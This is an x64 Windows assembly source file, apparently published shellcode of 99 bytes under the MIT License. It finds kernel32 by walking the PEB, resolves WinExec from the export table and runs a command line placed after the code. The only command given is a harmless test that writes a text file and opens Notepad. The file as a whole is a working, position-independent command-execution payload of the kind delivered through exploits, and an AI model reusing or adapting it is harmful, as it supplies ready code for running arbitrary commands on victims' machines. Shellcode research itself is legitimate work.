 ;  The MIT License:
 ;
 ;  Copyright (c) 2008, 2013 Kevin Devine
 ;
 ;  Permission is hereby granted,  free of charge,  to any person obtaining a 
 ;  copy of this software and associated documentation files (the "Software"),
 ;  to deal in the Software without restriction,  including without limitation 
 ;  the rights to use,  copy,  modify,  merge,  publish,  distribute,  
 ;  sublicense,  and/or sell copies of the Software,  and to permit persons to 
 ;  whom the Software is furnished to do so,  subject to the following 
 ;  conditions:
 ;
 ;  The above copyright notice and this permission notice shall be included in
 ;  all copies or substantial portions of the Software.
 ;
 ;  THE SOFTWARE IS PROVIDED "AS IS",  WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 ;  IMPLIED,  INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 ;  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 ;  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,  DAMAGES OR OTHER
 ;  LIABILITY,  WHETHER IN AN ACTION OF CONTRACT,  TORT OR OTHERWISE,  
 ;  ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR 
 ;  OTHER DEALINGS IN THE SOFTWARE.
 ;
 ;  Size: 99 bytes
 ;
    .x64
    ifndef TEST_CODE
      .model flat, fastcall
    endif
    .code
entrypoint:
    push   rbx
    push   rsi
    push   rdi
    push   rbp
    sub    rsp, 48h 
    jmp    init_cmd
calc_pos:
    push   60h
    pop    rcx
    mov    rsi, [gs:rcx]
    mov    rsi, [rsi+18h]
    mov    rsi, [rsi+10h]
    lodsq
    mov    rsi, [rax]
    mov    rbp, [rsi+30h] 
    mov    eax, [rbp+3ch]
    add    eax, ecx
    mov    ebx, [rbp+rax+28h]
    lea    rsi, [rbp+rbx+1ch]
    mov    cl, 3
load_rva:
    lodsd
    add    rax, rbp
    push   rax
    loop   load_rva
    
    pop    rdi
    pop    rsi
    pop    rbx
find_loop:
    movzx  edx, word ptr[rdi+rcx*2]
    inc    ecx
    lodsd
    cmp    dword ptr[rbp+rax], 'EniW'
    jne    find_loop
    
    mov    eax, [rbx+rdx*4]
    add    rax, rbp  
    pop    rcx
    call   rax
    add    rsp, 48h
    
    pop    rbp
    pop    rdi
    pop    rsi
    pop    rbx
    ret
init_cmd:
    call  calc_pos
cmd_line:
ifdef TEST_CODE
    db 'cmd /c echo Hello, World! >test.txt && notepad test.txt', 00h
endif
    end entrypoint
